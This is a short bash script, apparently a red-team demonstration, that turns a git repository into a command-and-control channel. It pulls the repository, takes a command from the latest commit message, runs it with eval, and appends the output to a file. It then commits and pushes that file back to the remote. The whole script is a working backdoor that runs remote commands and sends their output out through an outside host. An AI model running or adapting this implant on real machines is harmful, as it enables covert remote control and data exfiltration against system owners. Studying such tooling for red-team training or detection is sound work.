#!/usr/bin/bash

# Change with your BASEDIR: default /tmp/sToolz
BASEDIR=/tmp/sToolz 

# repo update
cd $BASEDIR
git pull

# get command
CMD=$(git log -1 | awk 'NR==5 {print $1}')

# check NOP
if [ "$CMD" = 'NOP' ]
then
    # do nothing
    echo "NOP"
else
    # format output
    NOW=date
    echo "########################################" >> $BASEDIR/RedTeam/C2demo/output.txt
    echo "# $NOW "                               >> $BASEDIR/RedTeam/C2demo/output.txt
    echo "########################################" >> $BASEDIR/RedTeam/C2demo/output.txt
    echo ""                                         >> $BASEDIR/RedTeam/C2demo/output.txt

    # do something
    ### IFS=', ' read -r -a array <<< $CMD
    eval "$CMD" >> $BASEDIR/RedTeam/C2demo/output.txt

    # commit and push
    git add .
    git commit -m "NOP"
    git push
    echo "Information sent..."
fi
